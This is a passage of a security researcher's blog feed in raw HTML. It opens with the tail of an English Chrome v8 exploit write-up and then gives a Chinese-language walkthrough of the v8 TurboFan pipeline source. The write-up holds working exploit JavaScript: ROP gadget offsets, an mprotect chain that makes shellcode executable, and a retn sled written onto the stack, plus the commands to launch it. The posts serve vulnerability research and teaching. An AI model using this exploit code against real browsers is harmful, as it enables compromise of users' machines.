pop_rsi = bin_base+<span class="number">0x267e82en</span>;</span><br><span class="line">  <span class="keyword">let</span> pop_rdx = bin_base+<span class="number">0x26a8d66n</span>;</span><br><span class="line">  <span class="keyword">let</span> mprotect = bin_base+<span class="number">0x88278f0n</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sc_array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">    sc_array[i] = sc[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sc_addr = readq((leak_ptr(sc_array)<span class="number">-1n</span>+<span class="number">0x68n</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`sc_addr: <span class="subst">$&#123;sc_addr.hex()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rop = [</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">4096n</span>,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">7n</span>,</span><br><span class="line">    mprotect,</span><br><span class="line">    sc_addr</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">let</span> rop_start = stack_ptr - <span class="number">8n</span>*BigInt(rop.length);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">    writeq(rop_start+<span class="number">8n</span>*BigInt(i), rop[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">    rop_start -= <span class="number">8n</span>;</span><br><span class="line">    writeq(rop_start, nop);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The addresses in red rectangle is environment variable, and the contents in yellow rectangle are <code>0x200*retn</code>, <strong>variable <code>nop</code> here represents <code>retn</code> instruction but not 0x90</strong>(<code>nop</code> instruction), we the code executes <code>retn</code>，it will keep returning until executing our ROP。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">  rop_start -= <span class="number">8n</span>;</span><br><span class="line">  writeq(rop_start, nop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090853.png" alt=""></p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;chrome</span><br><span class="line">.&#x2F;chrome index.html</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091400.jpg" alt=""></p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h3><p>I would acknowledge stephen(@_tsuro) who guides me and points out my stupid mistakes.<br>Debugging d8 is quite different from chrome，when leaking cxa，it will map builtin to a random address，and cxa is mapped to libv8.so，so we cannot find offset via cxa.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091930.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091917.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091900.png" alt=""><br>When you complete a arbitrary r/w primitive in v8，you can exploit chrome via the script without additional debug（yes, u don’t need to debug a full chrome)</p><p>Thanks Auxy(@realAuxy233) for translating~<br>If you find any errors or corrections, contact me. </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/google/google-
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 pipeline</title>
    <link href="http://eternalsakura13.com/2018/09/05/pipeline/"/>
    <id>http://eternalsakura13.com/2018/09/05/pipeline/</id>
    <published>2018-09-05T03:33:05.350Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v8::internal::GeneratedCode</span><br><span class="line">    -&gt; RUNTIME_FUNCTION(Runtime_CompileOptimized_NotConcurrent)</span><br><span class="line">        -&gt; Compiler::CompileOptimized</span><br><span class="line">            -&gt; GetOptimizedCode</span><br><span class="line">                -&gt; GetOptimizedCodeNow</span><br><span class="line">                    -&gt; OptimizedCompilationJob::PrepareJob</span><br><span class="line">                        -&gt; PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</span><br><span class="line">                            -&gt; PipelineImpl::CreateGraph()</span><br><span class="line">                                -&gt; BytecodeGraphBuilder::CreateGraph()</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; SetStart</span><br><span class="line">                                    -&gt; NewNodeUnchecked</span><br><span class="line">                                      -&gt; Node::New</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; env</span><br><span class="line">                                  -&gt; VisitBytecodes</span><br></pre></td></tr></table></figure><h3 id="Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent"><a href="#Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent" class="headerlink" title="Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)"></a>Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)</h3><p>参数1是要compile的function，参数2是一个标志,应该是和线程相关，表示function不在“正在编译的函数的队列”里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (mode &#x3D;&#x3D; ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">  if (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">    job.release();  &#x2F;&#x2F; The background recompile job owns this now.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set the optimization marker and return a code object which checks it.</span><br><span class="line">    function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">    DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">           (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">    return BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在这个函数中进行编译，这个函数首先检查function是否已经被编译过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (function-&gt;IsOptimized()) return true;</span><br></pre></td></tr></table></figure><p>然后进行编译优化，如果编译优化成功则以后在js中调用函数都执行编译后的code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#x2F;&#x2F; Install code on closure.</span><br><span class="line">function-&gt;set_code(*code);</span><br></pre></td></tr></table></figure><p>如果失败，则回到解释帧InterpreterEntryTrampoline执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code &#x3D; BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br></pre></td></tr></table></figure><h3 id="bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate"><a href="#bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate" class="headerlink" title="bool GetOptimizedCodeNow(OptimizedCompilationJob* job, Isolate* isolate)"></a>bool GetOptimizedCodeNow(OptimizedCompilationJob* job, Isolate* isolate)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (job-&gt;PrepareJob(isolate) != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;ExecuteJob() != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;FinalizeJob(isolate) != CompilationJob::SUCCEEDED) &#123;</span><br></pre></td></tr></table></figure><h3 id="CompilationJob-Status-OptimizedCompilationJob-PrepareJob"><a href="#CompilationJob-Status-OptimizedCompilationJob-PrepareJob" class="headerlink" title="CompilationJob::Status OptimizedCompilationJob::PrepareJob"></a>CompilationJob::Status OptimizedCompilationJob::PrepareJob</h3><p>v8里有非常多的status，很有意思。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_BOOL(trace_opt, <span class="literal">false</span>, <span class="string">"trace lazy optimization"</span>)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (FLAG_trace_opt &amp;&amp; compilation_info()-&gt;IsOptimizing()) &#123;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"[compiling method "</span> &lt;&lt; Brief(*compilation_info()-&gt;closure())</span><br><span class="line">       &lt;&lt; <span class="string">" using "</span> &lt;&lt; compiler_name_;</span><br><span class="line">    <span class="keyword">if</span> (compilation_info()-&gt;is_osr()) os &lt;&lt; <span class="string">" OSR"</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"]"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个函数就是调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return UpdateState(PrepareJobImpl(isolate), State::kReadyToExecute);</span><br></pre></td></tr></table></figure><h3 id="PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl"><a href="#PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl" class="headerlink" title="PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl"></a>PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</h3><p>前面根据一些标志位进行设置，包括下面这些等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; OptimizedCompilationInfo encapsulates the information needed to compile</span><br><span class="line">&#x2F;&#x2F; optimized code for a given function, and the results of the optimized</span><br><span class="line">&#x2F;&#x2F; compilation.</span><br><span class="line">class V8_EXPORT_PRIVATE OptimizedCompilationInfo final &#123;</span><br><span class="line"> public:</span><br><span class="line">  &#x2F;&#x2F; Various configuration flags for a compilation, as well as some properties</span><br><span class="line">  &#x2F;&#x2F; of the compiled code produced by a compilation.</span><br><span class="line">  enum Flag &#123;</span><br><span class="line">    kAccessorInliningEnabled &#x3D; 1 &lt;&lt; 0,</span><br><span class="line">    kFunctionContextSpecializing &#x3D; 1 &lt;&lt; 1,</span><br><span class="line">    kInliningEnabled &#x3D; 1 &lt;&lt; 2,</span><br><span class="line">    kDisableFutureOptimization &#x3D; 1 &lt;&lt; 3,</span><br><span class="line">    kSplittingEnabled &#x3D; 1 &lt;&lt; 4,</span><br><span class="line">    kSourcePositionsEnabled &#x3D; 1 &lt;&lt; 5,</span><br><span class="line">    kBailoutOnUninitialized &#x3D; 1 &lt;&lt; 6,</span><br><span class="line">    kLoopPeelingEnabled &#x3D; 1 &lt;&lt; 7,</span><br><span class="line">    kUntrustedCodeMitigations &#x3D; 1 &lt;&lt; 8,</span><br><span class="line">    kSwitchJumpTableEnabled &#x3D; 1 &lt;&lt; 9,</span><br><span class="line">    kCalledWithCodeStartRegister &#x3D; 1 &lt;&lt; 10,</span><br><span class="line">    kPoisonRegisterArguments &#x3D; 1 &lt;&lt; 11,</span><br><span class="line">    kAllocationFoldingEnabled &#x3D; 1 &lt;&lt; 12,</span><br><span class="line">    kAnalyzeEnvironmentLiveness &#x3D; 1 &lt;&lt; 13,</span><br><span class="line">    kTraceTurboJson &#x3D; 1 &lt;&lt; 14,</span><br><span class="line">    kTraceTurboGraph &#x3D; 1 &lt;&lt; 15,</span><br><span class="line">    kTraceTurboScheduled &#x3D; 1 &lt;&lt; 16,</span><br><span class="line">  &#125;;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">FLAG_always_opt</span><br><span class="line">FLAG_turbo_loop_peeling</span><br><span class="line">FLAG_turbo_inlining</span><br><span class="line">FLAG_inline_accessors</span><br><span class="line">FLAG_turbo_allocation_folding</span><br></pre></td></tr></table></figure><p>然后开始创建Graph</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pipeline_.CreateGraph()) &#123;</span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) <span class="keyword">return</span> FAILED;  <span class="comment">// Stack overflowed.</span></span><br><span class="line">  <span class="keyword">return</span> AbortOptimization(BailoutReason::kGraphBuildingFailed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PipelineImpl-CreateGraph"><a href="#PipelineImpl-CreateGraph" class="headerlink" title="PipelineImpl::CreateGraph()"></a>PipelineImpl::CreateGraph()</h3><p>检查trace标志位并做相应操作,主要是做记录。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">    info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br></pre></td></tr></table></figure><p>通过添加修饰器来记录源码位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-&gt;source_positions()-&gt;AddDecorator();</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Initial untyped"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Inlined"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Early trimmed"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Typed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Lowered typed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">  <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">  Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BytecodeGraphBuilder-CreateGraph"><a href="#BytecodeGraphBuilder-CreateGraph" class="headerlink" title="BytecodeGraphBuilder::CreateGraph()"></a>BytecodeGraphBuilder::CreateGraph()</h3><p>设置图的基本结构。<br>{Start}的输出是形参（包括receiver）加上new target, arguments数目,context和closure</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> actual_parameter_count = bytecode_array()-&gt;parameter_count() + <span class="number">4</span>;</span><br><span class="line">graph()-&gt;SetStart(graph()-&gt;NewNode(common()-&gt;Start(actual_parameter_count)));</span><br></pre></td></tr></table></figure><p>NewNode是用于创建新node的帮助函数。<br>common()返回CommonOperatorBuilder*的common_,差不多是一个op的集合了，然后从中选择Start</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> common_; &#125;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">const</span> Operator* <span class="title">Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator(                                    <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kStart, Operator::kFoldable | Operator::kNoThrow,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Start"</span>,                                                     <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, value_output_count, <span class="number">1</span>, <span class="number">1</span>);                          <span class="comment">// counts</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这个文件还是比较有用的，common-operator.cc，因为NewNode的opcode参数从这里初始化。</strong><br>回到NewNode看一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Factory template for nodes with static input counts.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Nodes&gt;</span><br><span class="line">  <span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> NewNode(op, nodes_arr.<span class="built_in">size</span>(), nodes_arr.data());</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"> <span class="function">Node* <span class="title">Graph::NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count, Node* <span class="keyword">const</span>* inputs,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">bool</span> incomplete)</span> </span>&#123;</span><br><span class="line">  Node* node = NewNodeUnchecked(op, input_count, inputs, incomplete);</span><br><span class="line">  Verifier::VerifyNode(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function">Node* <span class="title">Graph::NewNodeUnchecked</span><span class="params">(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                              Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> incomplete)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> node =</span><br><span class="line">      Node::New(zone(), NextNodeId(), op, input_count, inputs, incomplete);</span><br><span class="line">  Decorate(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是执行到了这里,于是我们来分析一下这个函数。</p><h4 id="Node-New"><a href="#Node-New" class="headerlink" title="Node::New"></a>Node::New</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">Node::New</span><span class="params">(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs)</span> </span>&#123;</span><br><span class="line">  Node** input_ptr;</span><br><span class="line">  Use* use_ptr;</span><br><span class="line">  Node* node;</span><br><span class="line">  <span class="keyword">bool</span> is_inline;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_count &gt; kMaxInlineCapacity) &#123;</span><br><span class="line">    <span class="comment">// Allocate out-of-line inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity =</span><br><span class="line">        has_extensible_inputs ? input_count + kMaxInlineCapacity : input_count;</span><br><span class="line">    OutOfLineInputs* outline = OutOfLineInputs::New(zone, capacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate node.</span></span><br><span class="line">    <span class="keyword">void</span>* node_buffer = zone-&gt;New(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, kOutlineMarker, <span class="number">0</span>);</span><br><span class="line">    node-&gt;inputs_.outline_ = outline;</span><br><span class="line"></span><br><span class="line">    outline-&gt;node_ = node;</span><br><span class="line">    outline-&gt;count_ = input_count;</span><br><span class="line"></span><br><span class="line">    input_ptr = outline-&gt;inputs_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(outline);</span><br><span class="line">    is_inline = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Allocate node with inline inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> <span class="built_in">max</span> = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::<span class="built_in">min</span>(input_count + <span class="number">3</span>, <span class="built_in">max</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line">    <span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(<span class="built_in">size</span>));</span><br><span class="line">    <span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br><span class="line"></span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, input_count, capacity);</span><br><span class="line">    input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(node);</span><br><span class="line">    is_inline = <span 